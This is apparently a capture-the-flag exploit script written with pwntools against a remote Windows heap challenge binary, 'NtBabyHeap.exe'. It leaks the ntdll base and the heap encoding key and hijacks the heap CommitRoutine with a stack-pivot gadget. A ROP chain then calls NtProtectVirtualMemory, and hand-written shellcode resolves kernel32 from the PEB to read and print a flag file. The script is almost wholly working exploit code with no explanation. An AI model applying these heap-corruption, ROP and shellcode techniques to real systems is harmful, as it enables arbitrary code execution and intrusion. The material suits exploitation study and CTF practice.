from pwn import *

context.arch='amd64'

#s=remote("192.168.43.112",13337)
s=remote("51.144.80.246", 13337)
#s=process("./NtBabyHeap.exe")

def add(size):
	s.sendlineafter("Enter Choice: ", str(1))
	s.sendlineafter("Enter size: ", str(size))

def free(idx):
	s.sendlineafter("Enter Choice: ", str(2))
	s.sendlineafter("Enter idx: ", str(idx))

def view(idx):
	s.sendlineafter("Enter Choice: ", str(3))
	s.sendlineafter("Enter idx: ", str(idx))
	
def edit(idx, offset, size, data):
	s.sendlineafter("Enter Choice: ", str(4))
	s.sendlineafter("Enter idx: ", str(idx))
	s.sendlineafter("Enter offset: ", str(offset))
	s.sendlineafter("Enter size: ", str(size))
	s.sendafter("Enter data: ", str(data))


add(0x500)
add(0x100)
edit(1,-0x548, 2, p16(0x2c1)) # ntdll!RtlpStaticDebugInfo
view(0)
s.recvuntil("Data: ")
ntdll=(u64("\x00"+s.recv(5)+"\x00\x00")-0x167000) & 0xfffffffffffff000
log.info("ntdll = " + hex(ntdll))

pivot = (ntdll+0x000d9c8) # leave; ret;
ropaddr = (ntdll+0x016b000)
ret = p64(ntdll+0x000717a)
pop_rbp = p64(ntdll+0x00000f7720) #: pop rbp; ret;
NtPVM = p64(ntdll+0x009b780) # NtProtectVirtualMemory
pop_rdx = p64(ntdll+0x00008b467) #: pop rdx; pop r11; ret;
pop_rcx = p64(ntdll+0x00008daaf) #: pop rcx; ret;
pop_r8_r9 = p64(ntdll+0x00008b462) #: pop r8; pop r9; pop r10; pop r11; ret;


# Write pivot to ntdll ropchain on heap
rop = ret + pop_rbp + p64(ropaddr+0x20) + p64(pivot)
edit(1,-0x548, 2, p16(0x1fd0)) 
edit(0, 0, 0x30, rop)

# Overwrite heap CommitRoutine
edit(1,-0x548, 2, p16(0x168))
view(0)
s.recvuntil("Data: ")
RtlpHeapKey=u64(s.recv(8))
log.info("RtlpHeapKey = " + hex(RtlpHeapKey))
edit(0,0,8,p64(pivot^RtlpHeapKey))

shelladdr = p64(ropaddr+0x3000 & 0xfffffffffffff000) 

# Write ropchain to call NtProtectVirtualMemory
rop = shelladdr + p64(0x2000) + p64(0) + ret*3 + pop_rdx + p64(ropaddr) + p64(0) + pop_rcx + p64(0xffffffffffffffff) + pop_r8_r9 + p64(ropaddr+8) + p64(0x40) + p64(0)*2 + NtPVM + ret + shelladdr +ret*2 + p64(ropaddr+0x10)*2 + ret*4
edit(1,-0x548, 8, p64(ropaddr)) 
edit(0, 0, len(rop), rop)



CreateFileA = 0x024af0
CreateFileW = 0x024b00

ReadFile = 0x024e80
WriteFile = 0x024f70
GetStdHandle = 0x001d430
flagUnicode1 = (0x00670061006c0066)
flagUnicode2 = (0x007400780074002e) 

shellcode  = asm("""
		mov rbp, rsp
		sub rsp, 0xc0
		xor eax, eax
		mov rax, [gs:0x60]
		mov rax, [rax+0x18]
		add rax, 0x20
		mov rax, [rax]
		mov rax, [rax]
		mov rax, [rax]
		sub rax, 0x10
		mov rsi, [rax+0x30]

 		CreateFileA:
                xor r11, r11
                push r11
                push r11
                mov r11, {fname2}
                push r11
		mov r11, {fname1}
		push r11
                mov rcx, rsp
                mov rdx, 0x80000000
                xor r8, r8
                push r8
                mov r8, 0x80
                push r8
                mov r8, 0x3
                push r8
                xor r8, r8
                xor r9, r9
                push r8
                push r8
                push r8
                push r8
                lea r12, [rsi+{Create}]
                call r12

                ReadFile:
                mov rcx, rax
                lea r13, [rsp+0x100]
                mov rdx, r13
                xor r8, r8
                push r8
                push r8
                push r8
                push r8
                push r8
                mov r8, 0x50
                xor r9, r9
                lea r12, [rsi+{Read}]
                call r12


                GetStdHandle:
                xor ecx, ecx
                mov ecx, 0xfffffff5
                lea r12, [rsi+{GetStd}]
                call r12

                WriteFile:
                mov rcx, rax
                mov rdx, r13
                xor r8, r8
                push r8
                push r8
                push r8
                push r8
                push r8
                mov r8, 0x50
                xor r9, r9
                lea r12, [rsi+{Write}]
                call r12
                ret

		""".format(fname1=flagUnicode1, fname2=flagUnicode2, Create=hex(CreateFileW), Read=hex(ReadFile), GetStd=hex(GetStdHandle), Write=hex(WriteFile)))

# Write shellcode 
edit(1,-0x548, 8, shelladdr) 
edit(0, 0, len(shellcode), shellcode)


# Pivot stack to heap -> execute ropchain
add(0x2000)
s.interactive()

